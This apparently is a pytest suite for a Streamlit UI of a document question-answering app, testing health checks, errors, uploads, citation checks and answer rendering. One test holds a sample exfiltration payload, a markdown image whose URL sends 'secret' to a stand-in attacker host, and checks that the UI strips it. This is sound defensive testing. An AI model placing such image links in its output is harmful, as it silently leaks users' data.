from pathlib import Path

import httpx
import pytest
from streamlit.testing.v1 import AppTest

from app.generation.citations import extract_citations as app_extract_citations
from ui.streamlit_app import (
    ApiResult,
    ask,
    citation_check,
    error_message,
    extract_citations,
    format_details,
    get_health,
    health_summary,
    remove_images,
    upload,
)

# HTTP is faked with httpx.MockTransport: no API, no Ollama, no browser.

APP_FILE = Path(__file__).resolve().parent.parent / "ui" / "streamlit_app.py"


def mock_client(handler) -> httpx.Client:
    return httpx.Client(base_url="http://api.test", transport=httpx.MockTransport(handler))


def respond(status: int, body) -> httpx.Client:
    return mock_client(lambda request: httpx.Response(status, json=body))


def test_health_ok_returns_data():
    body = {"status": "ok", "index_loaded": True, "chunks": 35, "llm_reachable": True, "model": "llama3.2:3b"}
    result = get_health(client=respond(200, body))
    assert result == ApiResult(ok=True, status=200, data=body)


def test_api_down_becomes_error_result_not_exception():
    def handler(request):
        raise httpx.ConnectError("connection refused")

    result = get_health(client=mock_client(handler))
    assert result.ok is False
    assert result.status is None
    assert "Cannot reach the API" in result.error


def test_api_timeout_becomes_error_result():
    def handler(request):
        raise httpx.ReadTimeout("slow")

    result = ask("anything", client=mock_client(handler))
    assert result.ok is False
    assert "did not answer" in result.error


def test_ask_sends_question_as_json():
    seen = {}

    def handler(request):
        seen["path"] = request.url.path
        seen["body"] = request.read()
        return httpx.Response(200, json={"answer": "x"})

    ask("How do I type a path parameter?", client=mock_client(handler))
    assert seen["path"] == "/ask"
    assert b'"question"' in seen["body"]


def test_ask_503_keeps_api_message():
    result = ask("q", client=respond(503, {"detail": "Cannot reach Ollama at http://localhost:11434/api/chat. Is it running?"}))
    assert result.ok is False
    assert result.status == 503
    assert "Ollama" in result.error


def test_ask_abstained_answer_is_ok_not_error():
    body = {"answer": "I couldn't find this in the documents.", "abstained": True, "sources": []}
    result = ask("What is the capital of France?", client=respond(200, body))
    assert result.ok is True
    assert result.data["abstained"] is True


def test_422_list_becomes_one_readable_sentence():
    detail = [{"loc": ["body", "question"], "msg": "String should have at least 1 character"}]
    response = httpx.Response(422, json={"detail": detail})
    assert error_message(response) == "question: String should have at least 1 character"


def test_non_json_error_falls_back_to_status_code():
    assert error_message(httpx.Response(500, text="Internal Server Error")) == "HTTP 500"


@pytest.mark.parametrize("status", [409, 413, 415])
def test_upload_refusal_returns_api_reason(status):
    result = upload("x.exe", b"MZ", None, client=respond(status, {"detail": "File type not allowed"}))
    assert result.ok is False
    assert result.status == status
    assert result.error == "File type not allowed"


def test_upload_sends_multipart_file():
    seen = {}

    def handler(request):
        seen["type"] = request.headers["content-type"]
        seen["body"] = request.read()
        return httpx.Response(201, json={"filename": "notes.md", "bytes": 5, "message": "Saved."})

    result = upload("notes.md", b"hello", "text/markdown", client=mock_client(handler))
    assert result.ok is True
    assert seen["type"].startswith("multipart/form-data")
    assert b'filename="notes.md"' in seen["body"]


def test_format_details_shows_model_prompt_and_timings():
    text = format_details(
        {"model": "llama3.2:3b", "prompt_version": "v1", "timings_ms": {"retrieve": 638.7, "generate": 2009.1, "total": 2649.4}}
    )
    assert "llama3.2:3b" in text and "v1" in text
    assert "retrieve 639 ms" in text and "total 2649 ms" in text


def test_remove_images_blocks_silent_requests_but_keeps_text_and_code():
    answer = "Use `item_id: int` [guide.pdf, p. 1]. ![x](http://evil.example/?q=secret) See [docs](http://localhost)."
    cleaned = remove_images(answer)
    assert "evil.example" not in cleaned
    assert "[image removed]" in cleaned
    assert "`item_id: int` [guide.pdf, p. 1]" in cleaned
    assert "[docs](http://localhost)" in cleaned


def test_page_shows_clear_error_when_api_is_down(monkeypatch):
    # Port 9 (discard) on localhost: nothing listens there, so the connection is refused quickly.
    monkeypatch.setenv("API_URL", "http://127.0.0.1:9")
    page = AppTest.from_file(str(APP_FILE), default_timeout=30).run()

    assert not page.exception
    assert any("Cannot reach the API" in e.value for e in page.error)
    assert any("uvicorn app.api.main:app" in c.value for c in page.code)


def test_ui_never_imports_app_internals():
    source = APP_FILE.read_text(encoding="utf-8")
    assert "from app" not in source
    assert "import app" not in source


# ---------- restyle: citation check, status badge, rendered answer ----------

CITATION_SAMPLES = [
    "Use item_id: int [guide.pdf, p. 1]. See also [notes.md].",
    "Same twice [guide.pdf, p. 2] and [guide.pdf, p. 2].",
    "Code is not a citation: return [user.value] or items[0].",
    "Case [Guide.PDF, p. 3] and spacing [guide.pdf,p.4].",
]


@pytest.mark.parametrize("text", CITATION_SAMPLES)
def test_ui_citation_rule_matches_the_app(text):
    # The UI keeps its own copy of the pattern (it may not import app.*), so it must agree with the app.
    assert extract_citations(text) == app_extract_citations(text)


def test_citation_check_marks_flagged_tags_invalid():
    answer = {
        "answer": "Typed with int [guide.pdf, p. 1] and validated [guide.pdf, p. 2].",
        "invalid_citations": ["[guide.pdf, p. 2]"],
    }
    assert citation_check(answer) == [
        {"tag": "[guide.pdf, p. 1]", "valid": True},
        {"tag": "[guide.pdf, p. 2]", "valid": False},
    ]


def test_citation_check_keeps_api_flags_the_pattern_missed():
    answer = {"answer": "No tags here.", "invalid_citations": ["[odd.pdf, p. 9]"]}
    assert citation_check(answer) == [{"tag": "[odd.pdf, p. 9]", "valid": False}]


@pytest.mark.parametrize(
    "health, words",
    [
        ({"index_loaded": True, "llm_reachable": True}, "Ready"),
        ({"index_loaded": True, "llm_reachable": False}, "Ollama offline"),
        ({"index_loaded": False, "llm_reachable": True}, "No index yet"),
    ],
)
def test_health_summary_always_has_words_not_only_colour(health, words):
    colour, icon, text = health_summary(health)
    assert text == words
    assert icon.startswith(":material/")
    assert colour in {"green", "orange"}


def _render(answer: dict):
    def script(answer):
        from ui.streamlit_app import render_answer

        render_answer({"role": "assistant", "answer": answer})

    return AppTest.from_function(script, args=(answer,), default_timeout=30).run()


ANSWER = {
    "answer": "Declare it with a type annotation [guide.pdf, p. 2].",
    "abstained": False,
    "invalid_citations": ["[guide.pdf, p. 2]"],
    "sources": [
        {"citation": "[guide.pdf, p. 1]", "source": "guide.pdf", "page": 1, "score": 0.47, "snippet": "item_id: int"},
    ],
    "prompt_version": "v1",
    "model": "fake",
    "timings_ms": {"retrieve": 10.0, "generate": 20.0, "total": 30.0},
}


def test_rendered_answer_shows_invalid_citation_in_words():
    page = _render(ANSWER)
    assert not page.exception
    text = " ".join(m.value for m in page.markdown)
    assert "not among the 1 sources the model was given" in text
    assert len(page.get("progress")) == 1  # one score bar per source
    assert "score 0.470" in str(page.get("progress")[0].proto)


def test_rendered_abstention_is_info_not_error():
    abstained = dict(ANSWER, answer="I couldn't find this in the documents.", abstained=True, invalid_citations=[],
                     timings_ms={"retrieve": 5.0, "generate": 0.0, "total": 5.0})
    page = _render(abstained)
    assert not page.exception
    assert len(page.info) == 1 and len(page.error) == 0
    assert any("nothing was sent to the LLM" in c.value for c in page.caption)


def test_ui_uses_no_emoji_icons():
    import re

    source = APP_FILE.read_text(encoding="utf-8")
    assert not re.search(r"[\U0001F300-\U0001FAFF]", source)
